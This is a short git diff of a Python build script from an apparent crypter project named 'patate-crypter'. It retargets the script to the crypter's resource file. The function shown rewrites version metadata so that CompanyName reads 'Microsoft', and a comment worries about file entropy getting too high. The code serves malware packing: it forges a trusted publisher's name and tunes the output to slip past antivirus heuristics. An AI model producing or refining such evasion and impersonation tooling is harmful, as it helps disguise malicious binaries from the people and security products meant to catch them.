@@ -26,11 +26,11 @@ def generate_bmp(filename):
         
 def change_metadata(icon_file) :
     number_of_bmp = 0#GetRandomRange(2, 6) makes the entropy go to 7.4 for ONE image, so very very very bad
-    f = open("DllExecutor.rc", "r")
+    f = open("../Crypter/patate-crypter.rc", "r")
     f_c = f.readlines()
     f.close()
  
-    o = open("DllExecutor.rc", "w")
+    o = open("../Crypter/patate-crypter.rc", "w")
     for line in f_c :
         if "CompanyName" in line :
             line = f'\t\t\tVALUE "CompanyName", "Microsoft"\n'
